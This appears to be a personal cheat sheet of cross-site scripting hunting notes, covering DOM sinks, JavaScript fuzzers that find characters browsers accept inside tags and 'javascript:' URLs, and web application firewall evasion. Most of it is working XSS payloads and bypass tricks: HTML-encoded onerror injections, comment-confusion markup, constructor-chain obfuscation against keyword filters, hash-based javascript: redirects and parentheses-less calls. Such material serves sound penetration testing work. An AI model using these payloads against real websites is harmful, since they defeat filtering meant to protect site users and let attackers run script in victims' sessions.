- 80% of time spent in **debugger** 
- what the browser shows in inspect is after all the decoding and permutations 
- how to find the event handlers (best way):
```js
Object.keys(window).filter(k => !k.indexOf('on'))
```
- do *more* DOM + postMessage 
	- first look for these:
		- *window.open*
		- *window.location*
		- *window.location.href*
# **FUZZ the whitespaces allowed** 
- [ ] (re read js for hackers)
- FUZZ for *HTML tags*
	- <img{fuzz}>src{fuzz}onerror=test
```js
const div = document.createElement('div'); const result = [];
const worked = p => result.push(p); for (let i=0;i<=0x10ffff; ++i)
{ div.innerHTML = `<img${String.fromCodePoint(i)}src${String.fromCodePoint(i)}onerror=worked(${i})>` } document.body.appendChild(div);
```
- FUZZ for *JS scheme*
	- javascript{FUZZ} also java{FUZZ}script 
		- (%0a, %0d,%09) (you must know)
	- {FUZZ}javascript ...
```js
log=[]; let anchor =document.createElement('a'); for(let i=0;i<0x10ffff; i++){ anchor.href = `javascript${String.fromCodePoint(i)};`; if (anchor.protocol === 'javascript:'){ log.push(i) } }
```
# **bypass**
- [ ] known waf ? -> search the net 
- [ ] CDN or application based ? -> build your own payload
- [ ] JS protection ? -> debug
- Do not use noisy Strings  
	- `<x> -> <x onxxx -> <x onxxx= `
### in HTML tags
- [ ] fuzz to find a valid tag
- [ ] *<ta[FUZZ]g> (it will gets valid server side)* #gold (***change after ruleset is a killer***)
- [ ] waf confusion 
	- [ ] *use HTML encoding* #gold
		- [ ] `<img src onerror=alert(1)` -> 403
		- [ ] `<img src>` -> 200
		- [ ] `<img src> onerror=alert(1)` -> 200
		- [ ] `<img src &#x3E onerror=alert(1)>` -> 200
```js
<!--` <img/src` onerror=alert(origin)> --!>
<img src="/" =_='' title="onerror='prompt(origin)'" >
<!<script>confirm(origin)</script>
```
### in JS execution
##### alert,prompt,etc (WORDS) are filtered ? 
- [ ] confuse
```js
- [](`cons`+`tructor`)(`const`+`ructor`)(`aler`+`t(origin)`)()
```
- [ ] payload in fragment part
```js
  location=location.hash.split('#')(1) // #javascript:alert(origin)
```
- [ ] unicode encode the js syntax
	- [ ] \u{0061}
	- [ ] \u{000000000000000000000061}
##### paranthesis,brackets,func() etc are filtered?
- [ ] **alert?.(origin)** -> use `?`
- [ ] window.valueOf=alert;window+1 -> **parentheses-less payloads**

#TODO 
- [**Waf Evasion Techniques**](https://blog.isec.pl/waf-evasion-techniques/)
- [An Interesting XSS-Bypassing WAF](https://labs.cognisys.group/posts/An-Intresting-XSS-Bypassing-WAF/)
